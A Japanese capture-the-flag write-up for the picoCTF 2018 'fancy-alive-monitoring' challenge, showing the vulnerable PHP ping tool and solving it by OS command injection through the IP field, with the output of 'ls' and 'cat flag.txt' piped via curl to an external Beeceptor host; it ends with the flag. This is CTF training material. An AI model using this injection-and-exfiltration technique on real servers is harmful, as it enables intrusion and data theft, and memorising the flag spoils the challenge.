# fancy-alive-monitoring

## Solve
```
One of my school mate developed an alive monitoring tool. 
Can you get a flag from http://2018shell.picoctf.com:31070 (link)?
```

## Hint
```
This application uses the validation check both on the client side and on the server side, 
but the server check seems to be inappropriate.
You should be able to listen through the shell on the server.
```

<br>

## Solution
picoCTFより、今は解けない状態になっているとのこと。

<br>

問題のページに移動するとソースコードがありました。

```php
<html>
<head>
   <title>Monitoring Tool</title>
   <script>
   function check(){
       ip = document.getElementById("ip").value;
       chk = ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
       if (!chk) {
           alert("Wrong IP format.");
           return false;
       } else {
           document.getElementById("monitor").submit();
       }
   }
   </script>
</head>
<body>
    <h1>Monitoring Tool ver 0.1</h1>
    <form id="monitor" action="index.php" method="post" onsubmit="return false;">
    <p> Input IP address of the target host
    <input id="ip" name="ip" type="text">
    </p>
    <input type="button" value="Go!" onclick="check()">
    </form>
    <hr>

<?php
$ip = $_POST["ip"];
if ($ip) {
    // super fancy regex check!
    if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) {
        exec('ping -c 1 '.$ip, $cmd_result);
        foreach($cmd_result as $str){
            if (strpos($str, '100% packet loss') !== false){
                printf("<h3>Target is NOT alive.</h3>");
                break;
            } else if (strpos($str, ', 0% packet loss') !== false){
                printf("<h3>Target is alive.</h3>");
                break;
            }
        }
    } else {
        echo "Wrong IP Format.";
    }
}
?>
<hr>
<a href="index.txt">index.php source code</a>
</body>
</html>
```

内容的に入力したIPアドレスにpingを送り、生きているかどうかを表示するサービスのようです。

なので今度は適当にaliveになりそうなIPアドレスを送ってみます。

```
$ curl -X POST http://2018shell.picoctf.com:56517 --data "ip=127.0.0.1"
<html>

<h3>Target is alive.</h3><hr>

</html>
```

すると`alive`が返ってきました。

<br>

次にパイプを使って後ろにコマンドを追加させます。

そしてそのコマンド結果を他のホストに送らせます。

今回は`Beeceptor`を使います。

まずはlsコマンドでファイルをチェックします。

```
$ curl -X POST http://2018shell.picoctf.com:56517 --data "ip=127.0.0.1; ls | xargs -n1 curl -X POST 'https://test.free.beeceptor.com/my/api/path' --data
flag.txt
index.php
index.txt
xinet_starup.sh
```

すると`flag.txt`というのがあることがわかりました。

あとはcatコマンドで同じように実行して中身を表示させます。

```
$ curl -X POST http://2018shell.picoctf.com:56517 --data "ip=127.0.0.1; cat flag.txt | xargs -n1 curl -X POST 'https://test.free.beeceptor.com/my/api/path' --data"
picoCTF{n3v3r_trust_a_b0x_36d4a875}
flag:
your
is
Here
```

するとcatコマンドが実行されてflagが表示されました。

<br><br>

## FLAG: picoCTF{n3v3r_trust_a_b0x_36d4a875}
